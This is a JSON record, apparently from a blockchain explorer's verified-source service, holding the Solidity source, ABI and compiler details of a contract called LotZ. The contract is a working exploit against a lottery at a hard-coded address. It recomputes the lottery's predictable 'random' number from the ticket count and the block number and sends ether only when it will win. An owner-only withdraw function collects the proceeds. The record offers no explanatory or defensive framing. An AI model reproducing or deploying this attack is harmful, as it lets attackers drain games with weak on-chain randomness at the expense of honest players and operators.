{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.24;\r\n\r\ncontract TheInterface {\r\n    function getTotalTickets() constant public returns (uint256);\r\n}\r\n\r\ncontract LotZ {\r\n\r\n    address private lotAddr = 0x53c2C4Ee7E625d0E415288d6e4E3F38a1BCB2038;\r\n    address private owner;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function doit() public payable {\r\n        TheInterface lot = TheInterface(lotAddr);\r\n        uint256 entry_number = lot.getTotalTickets() + 1;\r\n        uint lucky_number = uint(keccak256(abi.encodePacked(entry_number + block.number, uint256(0))));\r\n        require(lucky_number % 3 == 0);\r\n        require(lotAddr.call.value(msg.value)());\r\n    }\r\n\r\n    function() public payable {\r\n    }\r\n\r\n    function withdraw() public {\r\n        require(msg.sender == owner);\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"doit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"LotZ","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://dd68893030de0b310fbb73cadb4e5674286fa9ed05e77587c0f2addd120f002a"}]}